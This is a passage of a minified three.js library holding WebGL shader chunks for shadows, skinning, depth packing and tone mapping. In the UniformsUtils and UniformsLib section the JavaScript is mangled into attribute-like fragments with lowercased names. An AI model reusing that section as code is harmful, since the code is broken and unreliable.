r.xyz * ShiftRight8;\\treturn r * PackUpscale;\\n}\\nfloat unpackRGBAToDepth( const in vec4 v ) {\\n\\treturn dot( v, UnpackFactors );\\n}\\nfloat viewZToOrthographicDepth( const in float viewZ, const in float near, const in float far ) {\\n  return ( viewZ + near ) / ( near - far );\\n}\\nfloat orthographicDepthToViewZ( const in float linearClipZ, const in float near, const in float far ) {\\n  return linearClipZ * ( near - far ) - near;\\n}\\nfloat viewZToPerspectiveDepth( const in float viewZ, const in float near, const in float far ) {\\n  return (( near + viewZ ) * far ) / (( far - near ) * viewZ );\\n}\\nfloat perspectiveDepthToViewZ( const in float invClipZ, const in float near, const in float far ) {\\n  return ( near * far ) / ( ( far - near ) * invClipZ - far );\\n}\\n\" three.shaderchunk.premultiplied_alpha_fragment=\"#ifdef PREMULTIPLIED_ALPHA\\n\\tgl_FragColor.rgb *= gl_FragColor.a;\\n#endif\\n\" ;three.shaderchunk.project_vertex=\"#ifdef USE_SKINNING\\n\\tvec4 mvPosition = modelViewMatrix * skinned;\\n#else\\n\\tvec4 mvPosition = modelViewMatrix * vec4( transformed, 1.0 );\\n#endif\\ngl_Position = projectionMatrix * mvPosition;\\n\" ;three.shaderchunk.roughnessmap_fragment=\"float roughnessFactor = roughness;\\n#ifdef USE_ROUGHNESSMAP\\n\\tvec4 texelRoughness = texture2D( roughnessMap, vUv );\\n\\troughnessFactor *= texelRoughness.r;\\n#endif\\n\" three.shaderchunk.roughnessmap_pars_fragment=\"#ifdef USE_ROUGHNESSMAP\\n\\tuniform sampler2D roughnessMap;\\n#endif\" ;three.shaderchunk.shadowmap_pars_fragment=\"#ifdef USE_SHADOWMAP\\n\\t#if NUM_DIR_LIGHTS > 0\\n\\t\\tuniform sampler2D directionalShadowMap[ NUM_DIR_LIGHTS ];\\n\\t\\tvarying vec4 vDirectionalShadowCoord[ NUM_DIR_LIGHTS ];\\n\\t#endif\\n\\t#if NUM_SPOT_LIGHTS > 0\\n\\t\\tuniform sampler2D spotShadowMap[ NUM_SPOT_LIGHTS ];\\n\\t\\tvarying vec4 vSpotShadowCoord[ NUM_SPOT_LIGHTS ];\\n\\t#endif\\n\\t#if NUM_POINT_LIGHTS > 0\\n\\t\\tuniform sampler2D pointShadowMap[ NUM_POINT_LIGHTS ];\\n\\t\\tvarying vec4 vPointShadowCoord[ NUM_POINT_LIGHTS ];\\n\\t#endif\\n\\tfloat texture2DCompare( sampler2D depths, vec2 uv, float compare ) {\\n\\t\\treturn step( compare, unpackRGBAToDepth( texture2D( depths, uv ) ) );\\n\\t}\\n\\tfloat texture2DShadowLerp( sampler2D depths, vec2 size, vec2 uv, float compare ) {\\n\\t\\tconst vec2 offset = vec2( 0.0, 1.0 );\\n\\t\\tvec2 texelSize = vec2( 1.0 ) / size;\\n\\t\\tvec2 centroidUV = floor( uv * size + 0.5 ) / size;\\n\\t\\tfloat lb = texture2DCompare( depths, centroidUV + texelSize * offset.xx, compare );\\n\\t\\tfloat lt = texture2DCompare( depths, centroidUV + texelSize * offset.xy, compare );\\n\\t\\tfloat rb = texture2DCompare( depths, centroidUV + texelSize * offset.yx, compare );\\n\\t\\tfloat rt = texture2DCompare( depths, centroidUV + texelSize * offset.yy, compare );\\n\\t\\tvec2 f = fract( uv * size + 0.5 );\\n\\t\\tfloat a = mix( lb, lt, f.y );\\n\\t\\tfloat b = mix( rb, rt, f.y );\\n\\t\\tfloat c = mix( a, b, f.x );\\n\\t\\treturn c;\\n\\t}\\n\\tfloat getShadow( sampler2D shadowMap, vec2 shadowMapSize, float shadowBias, float shadowRadius, vec4 shadowCoord ) {\\n\\t\\tshadowCoord.xyz /= shadowCoord.w;\\n\\t\\tshadowCoord.z += shadowBias;\\n\\t\\tbvec4 inFrustumVec = bvec4 ( shadowCoord.x >= 0.0, shadowCoord.x <= 1.0, shadowCoord.y >= 0.0, shadowCoord.y <= 1.0 );\\n\\t\\tbool inFrustum = all( inFrustumVec );\\n\\t\\tbvec2 frustumTestVec = bvec2( inFrustum, shadowCoord.z <= 1.0 );\\n\\t\\tbool frustumTest = all( frustumTestVec );\\n\\t\\tif ( frustumTest ) {\\n\\t\\t#if defined( SHADOWMAP_TYPE_PCF )\\n\\t\\t\\tvec2 texelSize = vec2( 1.0 ) / shadowMapSize;\\n\\t\\t\\tfloat dx0 = - texelSize.x * shadowRadius;\\n\\t\\t\\tfloat dy0 = - texelSize.y * shadowRadius;\\n\\t\\t\\tfloat dx1 = + texelSize.x * shadowRadius;\\n\\t\\t\\tfloat dy1 = + texelSize.y * shadowRadius;\\n\\t\\t\\treturn (\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx0, dy0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( 0.0, dy0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx1, dy0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx0, 0.0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy, shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx1, 0.0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx0, dy1 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( 0.0, dy1 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx1, dy1 ), shadowCoord.z )\\n\\t\\t\\t) * ( 1.0 / 9.0 );\\n\\t\\t#elif defined( SHADOWMAP_TYPE_PCF_SOFT )\\n\\t\\t\\tvec2 texelSize = vec2( 1.0 ) / shadowMapSize;\\n\\t\\t\\tfloat dx0 = - texelSize.x * shadowRadius;\\n\\t\\t\\tfloat dy0 = - texelSize.y * shadowRadius;\\n\\t\\t\\tfloat dx1 = + texelSize.x * shadowRadius;\\n\\t\\t\\tfloat dy1 = + texelSize.y * shadowRadius;\\n\\t\\t\\treturn (\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx0, dy0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( 0.0, dy0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx1, dy0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx0, 0.0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy, shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx1, 0.0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx0, dy1 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( 0.0, dy1 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx1, dy1 ), shadowCoord.z )\\n\\t\\t\\t) * ( 1.0 / 9.0 );\\n\\t\\t#else\\n\\t\\t\\treturn texture2DCompare( shadowMap, shadowCoord.xy, shadowCoord.z );\\n\\t\\t#endif\\n\\t\\t}\\n\\t\\treturn 1.0;\\n\\t}\\n\\tvec2 cubeToUV( vec3 v, float texelSizeY ) {\\n\\t\\tvec3 absV = abs( v );\\n\\t\\tfloat scaleToCube = 1.0 / max( absV.x, max( absV.y, absV.z ) );\\n\\t\\tabsV *= scaleToCube;\\n\\t\\tv *= scaleToCube * ( 1.0 - 2.0 * texelSizeY );\\n\\t\\tvec2 planar = v.xy;\\n\\t\\tfloat almostATexel = 1.5 * texelSizeY;\\n\\t\\tfloat almostOne = 1.0 - almostATexel;\\n\\t\\tif ( absV.z >= almostOne ) {\\n\\t\\t\\tif ( v.z > 0.0 )\\n\\t\\t\\t\\tplanar.x = 4.0 - v.x;\\n\\t\\t} else if ( absV.x >= almostOne ) {\\n\\t\\t\\tfloat signX = sign( v.x );\\n\\t\\t\\tplanar.x = v.z * signX + 2.0 * signX;\\n\\t\\t} else if ( absV.y >= almostOne ) {\\n\\t\\t\\tfloat signY = sign( v.y );\\n\\t\\t\\tplanar.x = v.x + 2.0 * signY + 2.0;\\n\\t\\t\\tplanar.y = v.z * signY - 2.0;\\n\\t\\t}\\n\\t\\treturn vec2( 0.125, 0.25 ) * planar + vec2( 0.375, 0.75 );\\n\\t}\\n\\tfloat getPointShadow( sampler2D shadowMap, vec2 shadowMapSize, float shadowBias, float shadowRadius, vec4 shadowCoord ) {\\n\\t\\tvec2 texelSize = vec2( 1.0 ) / ( shadowMapSize * vec2( 4.0, 2.0 ) );\\n\\t\\tvec3 lightToPosition = shadowCoord.xyz;\\n\\t\\tvec3 bd3D = normalize( lightToPosition );\\n\\t\\tfloat dp = ( length( lightToPosition ) - shadowBias ) / 1000.0;\\n\\t\\t#if defined( SHADOWMAP_TYPE_PCF ) || defined( SHADOWMAP_TYPE_PCF_SOFT )\\n\\t\\t\\tvec2 offset = vec2( - 1, 1 ) * shadowRadius * texelSize.y;\\n\\t\\t\\treturn (\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xyy, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yyy, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xyx, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yyx, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xxy, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yxy, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xxx, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yxx, texelSize.y ), dp )\\n\\t\\t\\t) * ( 1.0 / 9.0 );\\n\\t\\t#else\\n\\t\\t\\treturn texture2DCompare( shadowMap, cubeToUV( bd3D, texelSize.y ), dp );\\n\\t\\t#endif\\n\\t}\\n#endif\\n\" three.shaderchunk.shadowmap_pars_vertex=\"#ifdef USE_SHADOWMAP\\n\\t#if NUM_DIR_LIGHTS > 0\\n\\t\\tuniform mat4 directionalShadowMatrix[ NUM_DIR_LIGHTS ];\\n\\t\\tvarying vec4 vDirectionalShadowCoord[ NUM_DIR_LIGHTS ];\\n\\t#endif\\n\\t#if NUM_SPOT_LIGHTS > 0\\n\\t\\tuniform mat4 spotShadowMatrix[ NUM_SPOT_LIGHTS ];\\n\\t\\tvarying vec4 vSpotShadowCoord[ NUM_SPOT_LIGHTS ];\\n\\t#endif\\n\\t#if NUM_POINT_LIGHTS > 0\\n\\t\\tuniform mat4 pointShadowMatrix[ NUM_POINT_LIGHTS ];\\n\\t\\tvarying vec4 vPointShadowCoord[ NUM_POINT_LIGHTS ];\\n\\t#endif\\n#endif\\n\" three.shaderchunk.shadowmap_vertex=\"#ifdef USE_SHADOWMAP\\n\\t#if NUM_DIR_LIGHTS > 0\\n\\tfor ( int i = 0; i < NUM_DIR_LIGHTS; i ++ ) {\\n\\t\\tvDirectionalShadowCoord[ i ] = directionalShadowMatrix[ i ] * worldPosition;\\n\\t}\\n\\t#endif\\n\\t#if NUM_SPOT_LIGHTS > 0\\n\\tfor ( int i = 0; i < NUM_SPOT_LIGHTS; i ++ ) {\\n\\t\\tvSpotShadowCoord[ i ] = spotShadowMatrix[ i ] * worldPosition;\\n\\t}\\n\\t#endif\\n\\t#if NUM_POINT_LIGHTS > 0\\n\\tfor ( int i = 0; i < NUM_POINT_LIGHTS; i ++ ) {\\n\\t\\tvPointShadowCoord[ i ] = pointShadowMatrix[ i ] * worldPosition;\\n\\t}\\n\\t#endif\\n#endif\\n\" three.shaderchunk.shadowmask_pars_fragment=\"float getShadowMask() {\\n\\tfloat shadow = 1.0;\\n\\t#ifdef USE_SHADOWMAP\\n\\t#if NUM_DIR_LIGHTS > 0\\n\\tDirectionalLight directionalLight;\\n\\tfor ( int i = 0; i < NUM_DIR_LIGHTS; i ++ ) {\\n\\t\\tdirectionalLight = directionalLights[ i ];\\n\\t\\tshadow *= bool( directionalLight.shadow ) ? getShadow( directionalShadowMap[ i ], directionalLight.shadowMapSize, directionalLight.shadowBias, directionalLight.shadowRadius, vDirectionalShadowCoord[ i ] ) : 1.0;\\n\\t}\\n\\t#endif\\n\\t#if NUM_SPOT_LIGHTS > 0\\n\\tSpotLight spotLight;\\n\\tfor ( int i = 0; i < NUM_SPOT_LIGHTS; i ++ ) {\\n\\t\\tspotLight = spotLights[ i ];\\n\\t\\tshadow *= bool( spotLight.shadow ) ? getShadow( spotShadowMap[ i ], spotLight.shadowMapSize, spotLight.shadowBias, spotLight.shadowRadius, vSpotShadowCoord[ i ] ) : 1.0;\\n\\t}\\n\\t#endif\\n\\t#if NUM_POINT_LIGHTS > 0\\n\\tPointLight pointLight;\\n\\tfor ( int i = 0; i < NUM_POINT_LIGHTS; i ++ ) {\\n\\t\\tpointLight = pointLights[ i ];\\n\\t\\tshadow *= bool( pointLight.shadow ) ? getPointShadow( pointShadowMap[ i ], pointLight.shadowMapSize, pointLight.shadowBias, pointLight.shadowRadius, vPointShadowCoord[ i ] ) : 1.0;\\n\\t}\\n\\t#endif\\n\\t#endif\\n\\treturn shadow;\\n}\\n\" three.shaderchunk.skinbase_vertex=\"#ifdef USE_SKINNING\\n\\tmat4 boneMatX = getBoneMatrix( skinIndex.x );\\n\\tmat4 boneMatY = getBoneMatrix( skinIndex.y );\\n\\tmat4 boneMatZ = getBoneMatrix( skinIndex.z );\\n\\tmat4 boneMatW = getBoneMatrix( skinIndex.w );\\n#endif\" ;three.shaderchunk.skinning_pars_vertex=\"#ifdef USE_SKINNING\\n\\tuniform mat4 bindMatrix;\\n\\tuniform mat4 bindMatrixInverse;\\n\\t#ifdef BONE_TEXTURE\\n\\t\\tuniform sampler2D boneTexture;\\n\\t\\tuniform int boneTextureWidth;\\n\\t\\tuniform int boneTextureHeight;\\n\\t\\tmat4 getBoneMatrix( const in float i ) {\\n\\t\\t\\tfloat j = i * 4.0;\\n\\t\\t\\tfloat x = mod( j, float( boneTextureWidth ) );\\n\\t\\t\\tfloat y = floor( j / float( boneTextureWidth ) );\\n\\t\\t\\tfloat dx = 1.0 / float( boneTextureWidth );\\n\\t\\t\\tfloat dy = 1.0 / float( boneTextureHeight );\\n\\t\\t\\ty = dy * ( y + 0.5 );\\n\\t\\t\\tvec4 v1 = texture2D( boneTexture, vec2( dx * ( x + 0.5 ), y ) );\\n\\t\\t\\tvec4 v2 = texture2D( boneTexture, vec2( dx * ( x + 1.5 ), y ) );\\n\\t\\t\\tvec4 v3 = texture2D( boneTexture, vec2( dx * ( x + 2.5 ), y ) );\\n\\t\\t\\tvec4 v4 = texture2D( boneTexture, vec2( dx * ( x + 3.5 ), y ) );\\n\\t\\t\\tmat4 bone = mat4( v1, v2, v3, v4 );\\n\\t\\t\\treturn bone;\\n\\t\\t}\\n\\t#else\\n\\t\\tuniform mat4 boneMatrices[ MAX_BONES ];\\n\\t\\tmat4 getBoneMatrix( const in float i ) {\\n\\t\\t\\tmat4 bone = boneMatrices[ int(i) ];\\n\\t\\t\\treturn bone;\\n\\t\\t}\\n\\t#endif\\n#endif\\n\" three.shaderchunk.skinning_vertex=\"#ifdef USE_SKINNING\\n\\tvec4 skinVertex = bindMatrix * vec4( transformed, 1.0 );\\n\\tvec4 skinned = vec4( 0.0 );\\n\\tskinned += boneMatX * skinVertex * skinWeight.x;\\n\\tskinned += boneMatY * skinVertex * skinWeight.y;\\n\\tskinned += boneMatZ * skinVertex * skinWeight.z;\\n\\tskinned += boneMatW * skinVertex * skinWeight.w;\\n\\tskinned  = bindMatrixInverse * skinned;\\n#endif\\n\" ;three.shaderchunk.skinnormal_vertex=\"#ifdef USE_SKINNING\\n\\tmat4 skinMatrix = mat4( 0.0 );\\n\\tskinMatrix += skinWeight.x * boneMatX;\\n\\tskinMatrix += skinWeight.y * boneMatY;\\n\\tskinMatrix += skinWeight.z * boneMatZ;\\n\\tskinMatrix += skinWeight.w * boneMatW;\\n\\tskinMatrix  = bindMatrixInverse * skinMatrix * bindMatrix;\\n\\tobjectNormal = vec4( skinMatrix * vec4( objectNormal, 0.0 ) ).xyz;\\n#endif\\n\" three.shaderchunk.specularmap_fragment=\"float specularStrength;\\n#ifdef USE_SPECULARMAP\\n\\tvec4 texelSpecular = texture2D( specularMap, vUv );\\n\\tspecularStrength = texelSpecular.r;\\n#else\\n\\tspecularStrength = 1.0;\\n#endif\" ;three.shaderchunk.specularmap_pars_fragment=\"#ifdef USE_SPECULARMAP\\n\\tuniform sampler2D specularMap;\\n#endif\" ;three.shaderchunk.tonemapping_fragment=\"#if defined( TONE_MAPPING )\\n  gl_FragColor.rgb = toneMapping( gl_FragColor.rgb );\\n#endif\\n\" three.shaderchunk.tonemapping_pars_fragment=\"#define saturate(a) clamp( a, 0.0, 1.0 )\\nuniform float toneMappingExposure;\\nuniform float toneMappingWhitePoint;\\nvec3 LinearToneMapping( vec3 color ) {\\n  return toneMappingExposure * color;\\n}\\nvec3 ReinhardToneMapping( vec3 color ) {\\n  color *= toneMappingExposure;\\n  return saturate( color / ( vec3( 1.0 ) + color ) );\\n}\\n#define Uncharted2Helper( x ) max( ( ( x * ( 0.15 * x + 0.10 * 0.50 ) + 0.20 * 0.02 ) / ( x * ( 0.15 * x + 0.50 ) + 0.20 * 0.30 ) ) - 0.02 / 0.30, vec3( 0.0 ) )\\nvec3 Uncharted2ToneMapping( vec3 color ) {\\n  color *= toneMappingExposure;\\n  return saturate( Uncharted2Helper( color ) / Uncharted2Helper( vec3( toneMappingWhitePoint ) ) );\\n}\\nvec3 OptimizedCineonToneMapping( vec3 color ) {\\n  color *= toneMappingExposure;\\n  color = max( vec3( 0.0 ), color - 0.004 );\\n  return pow( ( color * ( 6.2 * color + 0.5 ) ) / ( color * ( 6.2 * color + 1.7 ) + 0.06 ), vec3( 2.2 ) );\\n}\\n\" three.shaderchunk.uv2_pars_fragment=\"#if defined( USE_LIGHTMAP ) || defined( USE_AOMAP )\\n\\tvarying vec2 vUv2;\\n#endif\" ;three.shaderchunk.uv2_pars_vertex=\"#if defined( USE_LIGHTMAP ) || defined( USE_AOMAP )\\n\\tattribute vec2 uv2;\\n\\tvarying vec2 vUv2;\\n#endif\" ;three.shaderchunk.uv2_vertex=\"#if defined( USE_LIGHTMAP ) || defined( USE_AOMAP )\\n\\tvUv2 = uv2;\\n#endif\" ;three.shaderchunk.uv_pars_fragment=\"#if defined( USE_MAP ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( USE_SPECULARMAP ) || defined( USE_ALPHAMAP ) || defined( USE_EMISSIVEMAP ) || defined( USE_ROUGHNESSMAP ) || defined( USE_METALNESSMAP )\\n\\tvarying vec2 vUv;\\n#endif\" three.shaderchunk.uv_pars_vertex=\"#if defined( USE_MAP ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( USE_SPECULARMAP ) || defined( USE_ALPHAMAP ) || defined( USE_EMISSIVEMAP ) || defined( USE_ROUGHNESSMAP ) || defined( USE_METALNESSMAP )\\n\\tvarying vec2 vUv;\\n\\tuniform vec4 offsetRepeat;\\n#endif\\n\" ;three.shaderchunk.uv_vertex=\"#if defined( USE_MAP ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( USE_SPECULARMAP ) || defined( USE_ALPHAMAP ) || defined( USE_EMISSIVEMAP ) || defined( USE_ROUGHNESSMAP ) || defined( USE_METALNESSMAP )\\n\\tvUv = uv * offsetRepeat.zw + offsetRepeat.xy;\\n#endif\" three.shaderchunk.worldpos_vertex=\"#if defined( USE_ENVMAP ) || defined( PHONG ) || defined( PHYSICAL ) || defined( LAMBERT ) || defined ( USE_SHADOWMAP )\\n\\t#ifdef USE_SKINNING\\n\\t\\tvec4 worldPosition = modelMatrix * skinned;\\n\\t#else\\n\\t\\tvec4 worldPosition = modelMatrix * vec4( transformed, 1.0 );\\n\\t#endif\\n#endif\\n\" three.uniformsutils=\"{merge:function(a){for(var\" b=\"{},c=0;c<a.length;c++){var\" d=\"this.clone(a[c]),e;for(e\" in=\"\" d)b[e]=\"d[e]}return\" b},clone:function(a){var=\"\" a){b[c]=\"{};for(var\" a[c]){var=\"\" e=\"a[c][d];e\" instanceof=\"\" three.color||e=\"\" three.vector2||e=\"\" three.vector3||e=\"\" three.vector4||e=\"\" three.matrix3||e=\"\" three.matrix4||e=\"\" three.texture?b[c][d]=\"e.clone():Array.isArray(e)?b[c][d]=e.slice():b[c][d]=e}}return\" b}};=\"\" three.uniformslib=\"{common:{diffuse:{value:new\" three.color(15658734)},opacity:{value:1},map:{value:null},offsetrepeat:{value:new=\"\" three.vector4(0,0,1,1)},specularmap:{value:null},alphamap:{value:null},envmap:{value:null},flipenvmap:{value:-1},reflectivity:{value:1},refractionratio:{value:.98}},aomap:{aomap:{value:null},aomapintensity:{value:1}},lightmap:{lightmap:{value:null},lightmapintensity:{value:1}},emissivemap:{emissivemap:{value:null}},bumpmap:{bumpmap:{value:null},bumpscale:{value:1}},normalmap:{normalmap:{value:null},=\"\" normalscale:{value:new=\"\" three.vector2(1,1)}},displacementmap:{displacementmap:{value:null},displacementscale:{value:1},displacementbias:{value:0}},roughnessmap:{roughnessmap:{value:null}},metalnessmap:{metalnessmap:{value:null}},fog:{fogdensity:{value:2.5e-4},fognear:{value:1},fogfar:{value:2e3},fogcolor:{value:new=\"\" three.color(16777215)}},lights:{ambientlightcolor:{value:[]},directionallights:{value:[],properties:{direction:{},color:{},shadow:{},shadowbias:{},shadowradius:{},shadowmapsize:{}}},directionalshadowmap:{value:[]},=\"\" directionalshadowmatrix:{value:[]},spotlights:{value:[],properties:{color:{},position:{},direction:{},distance:{},conecos:{},penumbracos:{},decay:{},shadow:{},shadowbias:{},shadowradius:{},shadowmapsize:{}}},spotshadowmap:{value:[]},spotshadowmatrix:{value:[]},pointlights:{value:[],properties:{color:{},position:{},decay:{},distance:{},shadow:{},shadowbias:{},shadowradius:{},shadowmapsize:{}}},pointshadowmap:{value:[]},pointshadowmatrix:{value:[]},hemispherelights:{value:[],properties:{direction:{},=\"\" skycolor:{},groundcolor:{}}}},points:{diffuse:{value:new=\"\" three.color(15658734)},opacity:{value:1},size:{value:1},scale:{value:1},map:{value:null},offsetrepeat:{value:new=\"\" three.vector4(0,0,1,1)}}};three.shaderchunk.cube_frag=\"uniform samplerCube tCube;\\nuniform float tFlip;\\nvarying vec3 vWorldPosition;\\n#include <common>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tgl_FragColor = textureCube( tCube, vec3( tFlip * vWorldPosition.x, vWorldPosition.yz ) );\\n\\t#include <logdepthbuf_fragment>\\n}\\n\" three.shaderchunk.cube_vert=\"varying vec3 vWorldPosition;\\n#include <common>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\tvWorldPosition = transformDirection( position, modelMatrix );\\n\\t#include <begin_vertex>\\n\\t#include <project_vertex>\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <clipping_planes_vertex>\\n}\\n\" ;three.shaderchunk.depth_frag=\"#if DEPTH_PACKING == 3200\\n\\tuniform float opacity;\\n#endif\\n#include <common>\\n#include <packing>\\n#include <uv_pars_fragment>\\n#include <map_pars_fragment>\\n#include <alphamap_pars_fragment>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tvec4 diffuseColor = vec4( 1.0 );\\n\\t#if DEPTH_PACKING == 3200\\n\\t\\tdiffuseColor.a = opacity;\\n\\t#endif\\n\\t#include <map_fragment>\\n\\t#include <alphamap_fragment>\\n\\t#include <alphatest_fragment>\\n\\t#include <logdepthbuf_fragment>\\n\\t#if DEPTH_PACKING == 3200\\n\\t\\tgl_FragColor = vec4( vec3( gl_FragCoord.z ), opacity );\\n\\t#elif DEPTH_PACKING == 3201\\n\\t\\tgl_FragColor = packDepthToRGBA( gl_FragCoord.z );\\n\\t#endif\\n}\\n\" three.shaderchunk.depth_vert=\"#include <common>\\n#include <uv_pars_vertex>\\n#include <displacementmap_pars_vertex>\\n#include <morphtarget_pars_vertex>\\n#include <skinning_pars_vertex>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\t#include <uv_vertex>\\n\\t#include <skinbase_vertex>\\n\\t#include <begin_vertex>\\n\\t#include <displacementmap_vertex>\\n\\t#include <morphtarget_vertex>\\n\\t#include <skinning_vertex>\\n\\t#include <project_vertex>\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <clipping_planes_vertex>\\n}\\n\" three.shaderchunk.distancergba_frag=\"uniform vec3 lightPos;\\nvarying vec4 vWorldPosition;\\n#include <common>\\n#include <packing>\\n#include <clipping_planes_pars_fragment>\\nvoid main () {\\n\\t#include <clipping_planes_fragment>\\n\\tgl_FragColor = packDepthToRGBA( length( vWorldPosition.xyz - lightPos.xyz ) / 1000.0 );\\n}\\n\" ;three.shaderchunk.distancergba_vert=\"varying vec4 vWorldPosition;\\n#include <common>\\n#include <morphtarget_pars_vertex>\\n#include <skinning_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\t#include <skinbase_vertex>\\n\\t#include <begin_vertex>\\n\\t#include <morphtarget_vertex>\\n\\t#include <skinning_vertex>\\n\\t#include <project_vertex>\\n\\t#include <worldpos_vertex>\\n\\t#include <clipping_planes_vertex>\\n\\tvWorldPosition = worldPosition;\\n}\\n\" three.shaderchunk.equirect_frag=\"uniform sampler2D tEquirect;\\nuniform float tFlip;\\nvarying vec3 vWorldPosition;\\n#include <common>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tvec3 direction = normalize( vWorldPosition );\\n\\tvec2 sampleUV;\\n\\tsampleUV.y = saturate( tFlip * direction.y * -0.5 + 0.5 );\\n\\tsampleUV.x = atan( direction.z, direction.x ) * RECIPROCAL_PI2 + 0.5;\\n\\tgl_FragColor = texture2D( tEquirect, sampleUV );\\n\\t#include <logdepthbuf_fragment>\\n}\\n\" three.shaderchunk.equirect_vert=\"varying vec3 vWorldPosition;\\n#include <common>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\tvWorldPosition = transformDirection( position, modelMatrix );\\n\\t#include <begin_vertex>\\n\\t#include <project_vertex>\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <clipping_planes_vertex>\\n}\\n\" ;three.shaderchunk.linedashed_frag=\"uniform vec3 diffuse;\\nuniform float opacity;\\nuniform float dashSize;\\nuniform float totalSize;\\nvarying float vLineDistance;\\n#include <common>\\n#include <color_pars_fragment>\\n#include <fog_pars_fragment>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tif ( mod( vLineDistance, totalSize ) > dashSize ) {\\n\\t\\tdiscard;\\n\\t}\\n\\tvec3 outgoingLight = vec3( 0.0 );\\n\\tvec4 diffuseColor = vec4( diffuse, opacity );\\n\\t#include <logdepthbuf_fragment>\\n\\t#include <color_fragment>\\n\\toutgoingLight = diffuseColor.rgb;\\n\\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\\n\\t#include <premultiplied_alpha_fragment>\\n\\t#include <tonemapping_fragment>\\n\\t#include <encodings_fragment>\\n\\t#include <fog_fragment>\\n}\\n\" three.shaderchunk.linedashed_vert=\"uniform float scale;\\nattribute float lineDistance;\\nvarying float vLineDistance;\\n#include <common>\\n#include <color_pars_vertex>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\t#include <color_vertex>\\n\\tvLineDistance = scale * lineDistance;\\n\\tvec4 mvPosition = modelViewMatrix * vec4( position, 1.0 );\\n\\tgl_Position = projectionMatrix * mvPosition;\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <clipping_planes_vertex>\\n}\\n\" three.shaderchunk.meshbasic_frag=\"uniform vec3 diffuse;\\nuniform float opacity;\\n#ifndef FLAT_SHADED\\n\\tvarying vec3 vNormal;\\n#endif\\n#include <common>\\n#include <color_pars_fragment>\\n#include <uv_pars_fragment>\\n#include <uv2_pars_fragment>\\n#include <map_pars_fragment>\\n#include <alphamap_pars_fragment>\\n#include <aomap_pars_fragment>\\n#include <envmap_pars_fragment>\\n#include <fog_pars_fragment>\\n#include 